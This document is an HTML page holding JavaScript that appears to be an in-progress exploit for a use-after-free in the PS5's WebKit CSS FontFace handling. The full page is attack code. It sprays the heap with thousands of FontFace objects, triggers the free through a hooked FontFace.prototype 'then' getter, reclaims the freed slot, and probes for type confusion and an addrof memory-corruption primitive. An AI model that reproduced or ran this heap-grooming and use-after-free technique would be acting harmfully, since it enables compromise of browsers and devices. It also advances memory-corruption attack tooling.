<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v11 - Dual Path</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;background:#080808;color:#bbb;
font-family:'Courier New',monospace;overflow:hidden}

#top{position:fixed;top:0;left:0;right:0;height:44px;
background:#0c0c0c;border-bottom:1px solid #1a3a2a;
display:flex;align-items:center;padding:0 12px;gap:12px;
z-index:10;font-size:13px}
.t{color:#00ffa0;font-weight:bold}.v{color:#0d0}.s{color:#333}

#bar{position:fixed;top:44px;left:0;right:0;height:3px;
background:#111;z-index:10}
#bar div{height:100%;background:#00ffa0;transition:width .3s}

#out{position:fixed;top:47px;left:0;right:0;bottom:0;
padding:10px 12px;overflow-y:auto;font-size:14px;line-height:1.5;
background:#080808;-webkit-user-select:text}
#out::-webkit-scrollbar{width:5px}
#out::-webkit-scrollbar-thumb{background:#2a4a3a;border-radius:3px}

.ok{color:#0f0}.fl{color:#f55}.wr{color:#fc0}.hi{color:#0ff;font-weight:bold}
.st{color:#f0f;font-weight:bold}.dm{color:#555}.hd{color:#00ffa0;font-weight:bold}

#c{position:absolute;left:-9999px;top:-9999px}
</style>
</head>
<body>
<div id="top">
<span class="t">v11 DualPath</span><span class="s">│</span>
<span class="v" id="hF">FW:?</span><span class="s">│</span>
<span class="v" id="hU">UAF:?</span><span class="s">│</span>
<span class="v" id="hR">RC:?</span><span class="s">│</span>
<span class="v" id="hP">PRIM:?</span>
</div>
<div id="bar"><div id="bp" style="width:0%"></div></div>
<div id="out"></div>
<canvas id="c" width="512" height="128"></canvas>
<script>
"use strict";

// ============================================================
//  PS5 WebKit v11 - Dual Path Exploitation
//
//  KEY FINDING: load("1em trigger, x","AB") returns RC_122!
//  RC_122's C++ CSSFontFace occupies the freed "x" slot!
//
//  STRATEGY:
//  1. Identify which RC face is in the "x" slot (via load)
//  2. Test consistency across multiple load() calls
//  3. Free the confused RC face
//  4. Spray controlled replacement faces
//  5. Use load() to read back through "x" path
//  6. If replacement shows different props = TYPE CONFUSION
//  7. Build addrof from type confusion
// ============================================================

const O=document.getElementById("out");
const bp=document.getElementById("bp");
function bar(p){bp.style.width=p+"%"}
function hud(id,v){const e=document.getElementById(id);if(e)e.textContent=v}
function P(m,c){const s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight;
try{console.log("[v11] "+m)}catch(e){}}
function Ok(m){P("✅ "+m,"ok")}function Fl(m){P("✘ "+m,"fl")}
function Wr(m){P("⚠ "+m,"wr")}function Hi(m){P("► "+m,"hi")}
function St(m){P("★ "+m+" ★","st")}function Dm(m){P(m,"dm")}
function Hd(m){P(m,"hd")}function Sep(){P("─".repeat(44),"dm")}

window.onerror=function(m,s,l){Fl("ERR: "+m+" @"+l)};

// ============================================================
//  State
// ============================================================
let keepAlive=[],holeFaces=[],reclaimFaces=[];
let uafTriggered=false,triggerFace=null;
let confusedRCIdx=-1,confusedRCFace=null;

// ============================================================
//  Font Buffer
// ============================================================
const FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
const FBb=(()=>{const s=atob(FB),b=new Uint8Array(s.length);
for(let i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){const c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}

// ============================================================
//  Helpers
// ============================================================
function fs(){void document.body.offsetTop;void document.documentElement.offsetHeight}
function addPads(n){const sh=document.getElementById("s").sheet;
for(let i=0;i<n;i++)sh.insertRule(
`@font-face{font-family:pad${i};src:url(np${i}.woff);unicode-range:U+E000}`,
sh.cssRules.length);fs()}
function addFlush(n){const st=document.createElement("style");st.id="flush";
document.head.appendChild(st);const sh=st.sheet;
for(let i=0;i<n;i++)sh.insertRule(
`@font-face{font-family:flush${i};src:url(nf${i}.woff);unicode-range:U+E000}`,
sh.cssRules.length);fs()}
function delFlush(){const e=document.getElementById("flush");
if(e&&e.sheet){while(e.sheet.cssRules.length)e.sheet.deleteRule(0);fs()}}
function killCk(){const f=new FontFace("ck"+keepAlive.length,"local(Helvetica)",
{unicodeRange:"U+E124"});document.fonts.add(f);keepAlive.push(f)}
function chk(sp,ch){try{return document.fonts.check(sp,ch)}catch(e){return null}}

// load() wrapper that returns face info
function loadFaces(spec,text){
return document.fonts.load(spec,text).then(faces=>{
return faces.map(f=>({family:f.family,style:f.style,weight:f.weight,
status:f.status,display:f.display,stretch:f.stretch,
unicodeRange:f.unicodeRange,variant:f.variant,
featureSettings:f.featureSettings,ref:f}));
}).catch(err=>[]);
}

// ============================================================
//  PHASE 1: Standard UAF
// ============================================================
function makeHoles(){
Hd("Creating holes...");
for(let i=0;i<4096;i++){const f=new FontFace("hole_"+i,mkBuf(),{
unicodeRange:"U+E1"+(i%16).toString(16),
style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100),
display:["auto","block","swap","fallback","optional"][i%5]});
document.fonts.add(f);holeFaces.push(f)}
fs();for(let i=1;i<holeFaces.length;i+=2)document.fonts.delete(holeFaces[i]);
fs();for(let i=0;i<4;i++){const t=[];for(let j=0;j<512;j++)t.push(new ArrayBuffer(4096))}
Ok("Holes ready")}

function spray(){Dm("Spraying 4096 RC...");
for(let i=0;i<4096;i++){const f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900",display:"block"});
document.fonts.add(f);reclaimFaces.push(f)}fs();Ok("Spray done")}

// ============================================================
//  PHASE 2: Identify Confused RC via load()
//  load("1em trigger, x","AB") should return an RC face
//  That RC face's C++ object is in the "x" slot
// ============================================================
async function identifyConfusedRC(){
Sep();Hd("IDENTIFY CONFUSED RC VIA load()");Sep();

// Test 1: Basic load
P("");Dm("Test: load('1em trigger, x', 'AB')");
const faces1=await loadFaces("1em trigger, x","AB");
P("  Returned "+faces1.length+" faces:");
for(let i=0;i<faces1.length;i++){
const f=faces1[i];
P("  ["+i+"] "+f.family+" "+f.style+" "+f.weight+" st="+f.status);
}

// Find the RC face
const rcFaces=faces1.filter(f=>f.family&&f.family.startsWith("RC_"));
if(rcFaces.length>0){
confusedRCFace=rcFaces[0].ref;
const m=rcFaces[0].family.match(/RC_(\d+)/);
if(m)confusedRCIdx=parseInt(m[1]);
St("CONFUSED RC: "+rcFaces[0].family+" (idx="+confusedRCIdx+")");
hud("hR","RC:"+confusedRCIdx);
}else{
Wr("No RC face in load result");
}

// Test 2: Consistency check
P("");Dm("Test: Consistency (5 load calls)");
const results=[];
for(let i=0;i<5;i++){
const f=await loadFaces("1em trigger, x","AB");
const rc=f.filter(x=>x.family&&x.family.startsWith("RC_"));
results.push(rc.length>0?rc[0].family:"none");
}
P("  Results: "+results.join(", "));
const consistent=results.every(r=>r===results[0]);
P("  Consistent: "+consistent,consistent?"ok":"wr");

// Test 3: Different load specs
P("");Dm("Test: Different load specs");
const specs=[
["1em trigger, x","AB"],
["1em trigger, x","A"],
["1em trigger, x","B"],
["64px x","B"],
["64px x","A"],
["900 italic 64px x","B"],
["1em x, trigger","AB"],
["1em x","B"]
];
for(const[sp,ch]of specs){
const f=await loadFaces(sp,ch);
const rc=f.filter(x=>x.family&&x.family.startsWith("RC_"));
P("  load('"+sp+"','"+ch+"') → "+f.length+" faces"+
(rc.length>0?" ["+rc[0].family+"]":""));
}

// Test 4: Read all properties of the confused RC face
if(confusedRCFace){
P("");Hd("CONFUSED RC FACE PROPERTIES:");
try{
const f=confusedRCFace;
P("  family:         "+f.family);
P("  style:          "+f.style);
P("  weight:         "+f.weight);
P("  stretch:        "+f.stretch);
P("  unicodeRange:   "+f.unicodeRange);
P("  variant:        "+f.variant);
P("  featureSettings:"+f.featureSettings);
P("  display:        "+f.display);
P("  status:         "+f.status);
}catch(e){Fl("  "+e.message)}
}

return confusedRCIdx>=0;
}

// ============================================================
//  PHASE 3: Dual-Path Access Test
//  Access the confused face through BOTH paths:
//  Path A: Direct JS reference (confusedRCFace.family = "RC_122")
//  Path B: Through load() → "x" family
//  If the two paths return different data = TYPE CONFUSION
// ============================================================
async function testDualPath(){
Sep();Hd("DUAL-PATH ACCESS TEST");Sep();

if(!confusedRCFace){Fl("No confused RC face");return}

P("");Dm("Path A: Direct JS reference");
P("  family:  "+confusedRCFace.family);
P("  style:   "+confusedRCFace.style);
P("  weight:  "+confusedRCFace.weight);
P("  status:  "+confusedRCFace.status);

P("");Dm("Path B: Through load('1em trigger, x','AB')");
const faces=await loadFaces("1em trigger, x","AB");
const rcViaLoad=faces.find(f=>f.family&&f.family.startsWith("RC_"));
if(rcViaLoad){
P("  family:  "+rcViaLoad.family);
P("  style:   "+rcViaLoad.style);
P("  weight:  "+rcViaLoad.weight);
P("  status:  "+rcViaLoad.status);
P("  display: "+rcViaLoad.display);
P("  stretch: "+rcViaLoad.stretch);
P("  unicode: "+rcViaLoad.unicodeRange);

// Check if Path A and Path B return the same JS object
const sameRef=(rcViaLoad.ref===confusedRCFace);
P("");P("  Same JS object: "+sameRef,sameRef?"wr":"hi");
if(sameRef){
Dm("  Both paths return same JS wrapper");
Dm("  Need to modify and detect changes");
}else{
St("DIFFERENT JS OBJECTS = TYPE CONFUSION!");
}
}else{
Fl("  No RC face found via load");
}

// Test: Modify confusedRCFace through Path A
// Then check if Path B reflects the change
P("");Dm("Test: Modify via Path A, read via Path B");
try{
const origWeight=confusedRCFace.weight;
confusedRCFace.weight="100";
fs();

const faces2=await loadFaces("1em trigger, x","AB");
const rc2=faces2.find(f=>f.family&&f.family.startsWith("RC_"));
if(rc2){
P("  After weight→100: load returns weight="+rc2.weight);
if(rc2.weight==="100"){
Hi("WRITE-THROUGH CONFIRMED! Path B sees change!");
}else{
Dm("  Path B still shows "+rc2.weight+" (cached)");
}
}

confusedRCFace.weight=origWeight;
fs();
}catch(e){Fl("  "+e.message)}

// Test: Modify via Path A (style)
P("");Dm("Test: Modify style via Path A");
try{
const origStyle=confusedRCFace.style;
confusedRCFace.style="normal";
fs();

const faces3=await loadFaces("1em trigger, x","AB");
const rc3=faces3.find(f=>f.family&&f.family.startsWith("RC_"));
if(rc3){
P("  After style→normal: load returns style="+rc3.style);
if(rc3.style==="normal")Hi("Style write-through works!");
}

confusedRCFace.style=origStyle;
fs();
}catch(e){Fl("  "+e.message)}

// Test: Modify unicodeRange
P("");Dm("Test: Modify unicodeRange via Path A");
try{
const origRange=confusedRCFace.unicodeRange;
confusedRCFace.unicodeRange="U+0042"; // change to cover 'B' only
fs();

// Try loading with just 'A' - should fail if unicodeRange change took effect
const faces4a=await loadFaces("1em trigger, x","A");
const faces4b=await loadFaces("1em trigger, x","B");
P("  After range→U+0042: load(A)="+faces4a.length+" load(B)="+faces4b.length);

confusedRCFace.unicodeRange=origRange;
fs();
}catch(e){Fl("  "+e.message)}
}

// ============================================================
//  PHASE 4: Free + Respray + Read
//  Free the confused RC face, spray replacements,
//  then read through the "x" path to see if we
//  can detect the replacement
// ============================================================
async function freeAndRespray(){
Sep();Hd("FREE + RESPRAY + READ");Sep();

if(confusedRCIdx<0){Fl("No confused RC identified");return}

P("");Dm("Step 1: Record baseline");
const baseline=await loadFaces("1em trigger, x","AB");
const blRC=baseline.find(f=>f.family&&f.family.startsWith("RC_"));
P("  Baseline: "+(blRC?blRC.family+" "+blRC.style+" "+blRC.weight:"none"));

P("");Dm("Step 2: Delete confused RC_"+confusedRCIdx);
try{
document.fonts.delete(confusedRCFace);
fs();
Ok("Deleted");
}catch(e){Fl("Delete error: "+e.message);return}

P("");Dm("Step 3: Force GC");
for(let i=0;i<8;i++){const t=[];for(let j=0;j<256;j++)t.push(new ArrayBuffer(8192))}

P("");Dm("Step 4: Check if 'x' path still works after delete");
const afterDel=await loadFaces("1em trigger, x","AB");
P("  After delete: "+afterDel.length+" faces");
for(const f of afterDel){
P("    "+f.family+" "+f.style+" "+f.weight+" st="+f.status);
}

if(afterDel.length===0){
Wr("'x' path returns nothing after delete");
Dm("The C++ object might have been freed");
}else{
const rcAfter=afterDel.find(f=>f.family&&f.family.startsWith("RC_"));
if(rcAfter){
Hi("Still returns RC face: "+rcAfter.family);
Dm("C++ object not yet freed or another RC took its place");
}else{
Hi("Returns different face type!");
}
}

P("");Dm("Step 5: Spray replacement faces with unique properties");
const replacements=[];
for(let i=0;i<2048;i++){
const f=new FontFace("REPL_"+i,mkBuf(),{
unicodeRange:"U+0041",
style: i%3===0?"normal":"italic",
weight: String([100,300,500,700,900][i%5]),
display:["auto","block","swap","fallback","optional"][i%5]
});
document.fonts.add(f);
replacements.push(f);
}
fs();
Ok("Sprayed "+replacements.length+" replacements");

P("");Dm("Step 6: Read through 'x' path");
const afterSpray=await loadFaces("1em trigger, x","AB");
P("  After spray: "+afterSpray.length+" faces");
for(const f of afterSpray){
P("    "+f.family+" "+f.style+" "+f.weight+" st="+f.status+
" display="+f.display+" stretch="+f.stretch);
}

// Check if a REPL face appears
const repl=afterSpray.find(f=>f.family&&f.family.startsWith("REPL_"));
if(repl){
St("REPLACEMENT FACE FOUND: "+repl.family);
St("TYPE CONFUSION: 'x' slot now holds "+repl.family);
Hi("  style:   "+repl.style);
Hi("  weight:  "+repl.weight);
Hi("  display: "+repl.display);
Hi("  range:   "+repl.unicodeRange);

// We now have DUAL ACCESS to this REPL face!
// Path A: Direct via document.fonts → REPL_N
// Path B: Via load("1em trigger, x","AB") → same C++ object
//
// If we modify REPL_N via Path A, the 'x' path should see it.
// This gives us write-through primitive!

// Find the JS reference
const replRef=replacements.find(r=>r.family===repl.family);
if(replRef){
P("");Hd("BUILDING WRITE-THROUGH PRIMITIVE");
P("  We control: "+replRef.family);
P("  Access via: load('1em trigger, x','AB')");

// Test write-through
try{
replRef.weight="200";fs();
const chk1=await loadFaces("1em trigger, x","AB");
const chk1r=chk1.find(f=>f.family&&f.family.startsWith("REPL_"));
P("  After weight→200: load returns weight="+chk1r.weight,
chk1r.weight==="200"?"hi":"dm");
}catch(e){Fl("  "+e.message)}

try{
replRef.style="oblique";fs();
const chk2=await loadFaces("1em trigger, x","AB");
const chk2r=chk2.find(f=>f.family&&f.family.startsWith("REPL_"));
P("  After style→oblique: load returns style="+chk2r.style,
chk2r.style==="oblique"?"hi":"dm");
}catch(e){Fl("  "+e.message)}
}

}else{
Wr("No REPL face in load result");
Dm("The freed slot wasn't reclaimed by our spray");

// Check what IS in the result
const anyRC=afterSpray.find(f=>f.family&&f.family.startsWith("RC_"));
if(anyRC){
Dm("Old RC face still present: "+anyRC.family);
}
}
}

// ============================================================
//  PHASE 5: addrof Construction
//  If we have dual-access + write-through, we can:
//  1. Create a face whose C++ data overlaps with
//     the freed CSSFontFace's memory
//  2. Use the load() path to read C++ fields
//  3. Specific property values might encode pointers
// ============================================================
async function attemptAddrof(){
Sep();Hd("ADDROF CONSTRUCTION");Sep();

// Re-identify the confused face
const faces=await loadFaces("1em trigger, x","AB");
const rc=faces.find(f=>f.family&&f.family.startsWith("RC_"));
const repl=faces.find(f=>f.family&&f.family.startsWith("REPL_"));
const target=repl||rc;

if(!target){
Fl("No confused face accessible via load()");
return;
}

P("Target face: "+target.family);
P("");Dm("Reading all accessible properties:");

// Read everything we can from the load() path
const props=[
"family","style","weight","stretch","unicodeRange",
"variant","featureSettings","display","status"
];

for(const p of props){
try{
const val=target.ref[p];
P("  "+p.padEnd(16)+" = "+val+" ("+typeof val+")");
}catch(e){
P("  "+p.padEnd(16)+" = ERROR: "+e.message,"fl");
}
}

// Try to access numeric or unusual properties
P("");Dm("Checking for hidden/internal properties:");
try{
const proto=Object.getPrototypeOf(target.ref);
const descs=Object.getOwnPropertyDescriptors(proto);
for(const[key,desc]of Object.entries(descs)){
if(desc.get){
try{
const val=target.ref[key];
const t=typeof val;
if(t==="number"&&val>0x1000){
Hi("NUMERIC PROP: "+key+" = "+val+" (0x"+val.toString(16)+")");
}else if(t==="object"&&val!==null){
Hi("OBJECT PROP: "+key+" = "+val);
}else{
Dm("  "+key+" = "+val);
}
}catch(e){}
}
}
}catch(e){}

// Try to leak address through load() timing
P("");Dm("Timing-based address inference:");
const ITERS=100;
const t0=performance.now();
for(let i=0;i<ITERS;i++){
await loadFaces("1em trigger, x","AB");
}
const elapsed=performance.now()-t0;
P("  "+ITERS+" load() calls: "+elapsed.toFixed(0)+"ms ("+
(elapsed/ITERS).toFixed(1)+"ms/call)");

// Try to create a face with specific buffer and detect it via load()
P("");Dm("Controlled buffer detection:");
try{
// Delete current confused face
if(confusedRCFace){
try{document.fonts.delete(confusedRCFace)}catch(e){}
}
for(const r of reclaimFaces){try{document.fonts.delete(r)}catch(e){}}
fs();

// GC
for(let i=0;i<4;i++){const t=[];for(let j=0;j<128;j++)t.push(new ArrayBuffer(8192))}

// Spray with VERY controlled buffer content
const ctrlBuf=new ArrayBuffer(0x200);
const cv=new DataView(ctrlBuf);
// TrueType header
cv.setUint32(0,0x00010000,false);
cv.setUint16(4,0,false);
// Fill with address-like values
for(let off=12;off<0x200;off+=8){
cv.setFloat64(off,1.1e-308+off,true); // NaN-boxed
}

const ctrlFaces=[];
for(let i=0;i<512;i++){
const f=new FontFace("CTRL_"+i,ctrlBuf,{
unicodeRange:"U+0041",style:"italic",weight:"900"});
document.fonts.add(f);
ctrlFaces.push(f);
}
fs();

// Check load()
const ctrlLoad=await loadFaces("1em trigger, x","AB");
const ctrlResult=ctrlLoad.find(f=>f.family&&f.family.startsWith("CTRL_"));
if(ctrlResult){
St("CONTROLLED FACE IN 'x' SLOT: "+ctrlResult.family);
Hi("  status: "+ctrlResult.status);

// If status is "error", the font data was parsed and rejected
// If status is "loaded", it was accepted
// Either way, the C++ object has a pointer to our buffer!

// Now try to read back the C++ object's interpretation
P("  Attempting to read C++ interpretation...");
for(const p of props){
try{
const val=ctrlResult.ref[p];
if(val&&typeof val==="string"&&val.length>20){
Hi("LONG STRING PROP: "+p+" = "+val.substring(0,60));
}
}catch(e){}
}
}else{
Dm("No CTRL face found in load result");
}

// Cleanup
for(const f of ctrlFaces)try{document.fonts.delete(f)}catch(e){}
fs();
}catch(e){Fl("Controlled buffer: "+e.message)}

hud("hP","PRIM:PROBE");
}

// ============================================================
//  Main
// ============================================================
window.onload=async()=>{
const ua=navigator.userAgent||"";
const m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
hud("hF","FW:"+(m?m[1]:"?"));

bar(5);makeHoles();

bar(15);Hd("Trigger setup");
triggerFace=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(triggerFace);void triggerFace.loaded;
addPads(48);addFlush(768);Ok("Trigger ready");

bar(25);Hd("Waiting for UAF...");

let fired=false;
Object.defineProperty(FontFace.prototype,"then",{configurable:true,
get(){if(!fired&&this===triggerFace){
fired=true;uafTriggered=true;hud("hU","UAF:✅");
St("UAF WINDOW OPEN");
killCk();document.getElementById("s").sheet.deleteRule(1);fs();
delFlush();for(let i=0;i<holeFaces.length;i+=4)try{document.fonts.delete(holeFaces[i])}catch(e){}
fs();for(let i=0;i<8;i++){const t=[];for(let j=0;j<256;j++)t.push(new ArrayBuffer(8192))}
spray();fs();
const d=document.createElement("div");d.textContent="AB";
d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
document.body.appendChild(d);void d.offsetWidth;
Dm("UAF window closed")}return undefined}});

let rn=0;const raf=()=>{rn++;
if(!fired&&rn>=5){try{killCk();const sh=document.getElementById("s").sheet;
if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs();delFlush();
for(let i=0;i<holeFaces.length;i+=4)try{document.fonts.delete(holeFaces[i])}catch(e){}
spray();fs()}}catch(e){}}
if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);

bar(35);Dm("Firing trigger...");

try{
const initFaces=await document.fonts.load("1em trigger, x","AB");
Dm("Initial load: "+initFaces.length+" faces");
for(let i=0;i<initFaces.length;i++){
Dm("  ["+i+"] "+initFaces[i].family+" "+initFaces[i].style+" "+initFaces[i].weight);
}
}catch(e){Fl("Initial load error: "+e)}

setTimeout(async()=>{
bar(45);const found=await identifyConfusedRC();

if(found){
bar(55);await testDualPath();
bar(70);await freeAndRespray();
bar(85);await attemptAddrof();
}else{
Fl("Could not identify confused RC face");
}

bar(100);
Sep();Hd("SUMMARY");Sep();
P("UAF:           "+(uafTriggered?"✅":"✘"),uafTriggered?"ok":"fl");
P("Confused RC:   "+(confusedRCIdx>=0?"RC_"+confusedRCIdx:"none"),
confusedRCIdx>=0?"hi":"dm");
P("Dual path:     "+(confusedRCFace?"✅":"✘"),confusedRCFace?"ok":"fl");
P("");
if(confusedRCIdx>=0){
St("DUAL-PATH PRIMITIVE AVAILABLE");
P("Use load('1em trigger, x','AB') to access","dm");
P("the confused face through 'x' family","dm");
}
},2500);
};
